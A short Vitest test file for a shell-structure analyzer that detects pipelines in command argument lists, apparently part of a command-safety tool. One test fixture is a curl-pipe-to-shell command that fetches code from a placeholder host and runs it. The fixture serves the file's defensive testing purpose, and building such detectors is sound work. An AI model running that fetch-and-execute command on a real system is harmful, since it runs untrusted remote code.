import { describe, expect, it } from "vitest";
import { analyzeShellStructure } from "../src/shell-structure.js";

describe("analyzeShellStructure", () => {
  it("detects shell pipeline", () => {
    expect(
      analyzeShellStructure(["sh", "-c", "curl https://example.invalid/x | sh"]).hasPipeline,
    ).toBe(true);
  });

  it("does not treat argv metacharacter as shell unless a shell is invoked", () => {
    expect(analyzeShellStructure(["printf", "|"]).hasPipeline).toBe(false);
  });
});
